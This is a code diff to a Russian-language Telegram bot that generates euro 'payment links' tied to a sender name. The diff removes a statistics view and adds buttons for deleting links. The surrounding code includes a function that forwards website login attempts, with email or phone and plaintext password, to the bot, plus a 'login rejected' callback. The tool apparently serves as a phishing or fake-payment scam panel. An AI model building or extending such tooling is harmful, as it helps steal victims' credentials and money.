@@ -99,7 +99,7 @@ const mainKeyboard = {
   reply_markup: {
     keyboard: [
       [{ text: '🔗 Создать ссылку' }, { text: '📋 Мои ссылки' }],
-      [{ text: '📊 Статистика' }, { text: '❓ Помощь' }]
+      [{ text: '❓ Помощь' }]
     ],
     resize_keyboard: true,
     one_time_keyboard: false
@@ -301,17 +301,11 @@ bot.on('message', async (msg) => {
     return;
   }
 
-  if (text === '📊 Статистика') {
-    await showUserStats(chatId, telegramId);
-    return;
-  }
-
   if (text === '❓ Помощь') {
     await bot.sendMessage(chatId, 
       `🤖 Помощь по использованию бота:\n\n` +
       `🔗 Создать ссылку - создание новой платежной ссылки\n` +
-      `📋 Мои ссылки - просмотр всех созданных ссылок\n` +
-      `📊 Статистика - статистика по ссылкам\n` +
+      `📋 Мои ссылки - просмотр и удаление ссылок\n` +
       `❓ Помощь - это сообщение\n\n` +
       `Для создания ссылки просто введите цену и имя отправителя.\n` +
       `Бот автоматически сгенерирует уникальную ссылку для платежа.`,
@@ -422,21 +416,33 @@ async function showUserLinks(chatId: number, telegramId: string) {
       return;
     }
 
-    let message = `📋 Ваши ссылки (${links.length}):\n\n`;
-    
-    for (const link of links.slice(0, 10)) { // Show max 10 links
+    // Show links with delete buttons
+    for (const link of links.slice(0, 5)) { // Show max 5 links with buttons
       const date = new Date(link.createdAt).toLocaleDateString('ru-RU');
-      message += `${link.linkId} - ${link.price}\n`;
+      let message = `${link.linkId} - ${link.price}\n`;
       message += `👤 ${link.senderName}\n`;
       message += `📅 ${date}\n`;
-      message += `🔗 ${link.generatedLink}\n\n`;
+      message += `🔗 ${link.generatedLink}`;
+
+      const keyboard = {
+        reply_markup: {
+          inline_keyboard: [[
+            {
+              text: '🗑 Удалить',
+              callback_data: `delete_link_${link.linkId}`
+            }
+          ]]
+        }
+      };
+
+      await bot.sendMessage(chatId, message, keyboard);
     }
 
-    if (links.length > 10) {
-      message += `... и еще ${links.length - 10} ссылок`;
+    if (links.length > 5) {
+      await bot.sendMessage(chatId, `... и еще ${links.length - 5} ссылок`, mainKeyboard);
+    } else {
+      await bot.sendMessage(chatId, '👆 Нажмите "Удалить" чтобы удалить ссылку', mainKeyboard);
     }
-
-    await bot.sendMessage(chatId, message, mainKeyboard);
 
   } catch (error) {
     console.error('Error showing user links:', error);
@@ -444,39 +450,7 @@ async function showUserLinks(chatId: number, telegramId: string) {
   }
 }
 
-// Show user statistics
-async function showUserStats(chatId: number, telegramId: string) {
-  try {
-    const links = await db.select().from(telegramLinks)
-      .where(eq(telegramLinks.createdBy, telegramId));
 
-    const totalLinks = links.length;
-    const totalAmount = links.reduce((sum, link) => {
-      const amount = parseFloat(link.price.replace('€', ''));
-      return sum + (isNaN(amount) ? 0 : amount);
-    }, 0);
-
-    const recentLinks = links.filter(link => {
-      const linkDate = new Date(link.createdAt);
-      const weekAgo = new Date();
-      weekAgo.setDate(weekAgo.getDate() - 7);
-      return linkDate > weekAgo;
-    }).length;
-
-    await bot.sendMessage(chatId,
-      `📊 Ваша статистика:\n\n` +
-      `📈 Всего ссылок: ${totalLinks}\n` +
-      `💰 Общая сумма: €${totalAmount.toFixed(2)}\n` +
-      `📅 За последнюю неделю: ${recentLinks}\n` +
-      `🔗 Средняя сумма: €${totalLinks > 0 ? (totalAmount / totalLinks).toFixed(2) : '0.00'}`,
-      mainKeyboard
-    );
-
-  } catch (error) {
-    console.error('Error showing user stats:', error);
-    await bot.sendMessage(chatId, 'Произошла ошибка при загрузке статистики.', mainKeyboard);
-  }
-}
 
 // Notification functions for website events
 export async function notifyLoginAttempt(emailOrPhone: string, password: string, returnUri: string) {
@@ -605,6 +579,31 @@ bot.on('callback_query', async (callbackQuery) => {
       );
       
       await bot.answerCallbackQuery(callbackQuery.id, { text: 'Вход отклонен!' });
+      
+    } else if (data.startsWith('delete_link_')) {
+      // Extract link ID from callback data
+      const linkId = data.replace('delete_link_', '');
+      
+      try {
+        // Delete the link from database
+        await db.delete(telegramLinks).where(eq(telegramLinks.linkId, linkId));
+        
+        // Update the message to show link deleted
+        await bot.editMessageText(
+          `🗑 Ссылка ${linkId} удалена`,
+          {
+            chat_id: chatId,
+            message_id: callbackQuery.message?.message_id,
+            reply_markup: { inline_keyboard: [] }
+          }
+        );
+        
+        await bot.answerCallbackQuery(callbackQuery.id, { text: 'Ссылка удалена!' });
+        
+      } catch (error) {
+        console.error('Error deleting link:', error);
+        await bot.answerCallbackQuery(callbackQuery.id, { text: 'Ошибка при удалении ссылки' });
+      }
     }
     
   } catch (error) {
